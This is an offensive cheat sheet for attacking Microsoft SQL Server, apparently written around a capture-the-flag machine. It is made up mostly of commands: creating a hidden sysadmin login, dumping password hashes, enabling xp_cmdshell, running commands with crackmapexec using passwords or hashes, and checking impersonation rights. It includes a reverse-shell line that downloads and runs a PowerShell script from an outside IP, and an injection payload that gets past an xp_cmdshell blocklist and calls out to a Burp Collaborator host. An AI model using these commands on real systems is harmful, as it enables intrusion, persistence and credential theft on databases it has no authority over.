Mssql
========================

## Accessing

    impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@escape.htb'


## Enumeration

Database names:

    SELECT name FROM master.dbo.sysdatabases;

Table names:

    SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;

Use database

    USE master

Create user with sysadmin privs

    CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
    EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

    select name, create_date, modify_date, type_desc as type, authentication_type_desc as authentication_type, sid from sys.database_principals where type not in ('A', 'R') order by name;

List user:

    select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;


## Command execution

XP_CMDSHELL

    SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

 Username + Password + CMD command

    crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"

Username + Hash + PS command

    crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'


This turns on advanced options and is needed to configure xp_cmdshell

    sp_configure 'show advanced options', '1'
    RECONFIGURE

This enables xp_cmdshell

    sp_configure 'xp_cmdshell', '1'
    RECONFIGURE

One liner

    sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', '1'; RECONFIGURE;

Quickly check what the service account is via xp_cmdshell

    EXEC master..xp_cmdshell 'whoami'

Get Rev shell

    EXEC xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/shell2.ps1')"

Bypass blackisted "EXEC xp_cmdshell"

    '; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
    
## Impersonation

Check impersonation users:

    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
    
